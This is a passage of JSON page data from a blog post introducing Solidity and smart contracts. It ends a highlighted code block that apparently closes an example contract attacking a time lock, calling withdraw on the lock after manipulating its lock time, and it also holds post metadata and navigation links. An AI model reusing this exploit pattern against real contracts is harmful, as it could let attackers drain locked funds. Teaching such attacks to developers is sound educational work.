class=\"token function\">lockTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            timeLock<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>","frontmatter":{"title":"learn Solidity - smart contract oriented language","date":"November 03, 2020","description":"Solidity is an object-oriented, high-level language for implementing smart contracts. It's designed to target the Ethereum Virtual Machine to implement Smart Contracts. It's influenced by C++, Python and JavaScript. So it will be easy to pick if you're familiar with any of the languages."}},"previous":{"fields":{"slug":"/redux/"},"frontmatter":{"title":"a walk through redux with react"}},"next":{"fields":{"slug":"/asyncjs/"},"frontmatter":{"title":"asynchronous JavaScript"}}},"pageContext":{"id":"96a35cf4-5689-5333-8514-842a18f59454","previousPostId":"e9fdf3cd-a157-5cc4-a747-c67f0174ec9c","nextPostId":"8410f82a-71cf-5d83-8b2e-c797391f20b7"}},"staticQueryHashes":["2841359383","3257411868"]}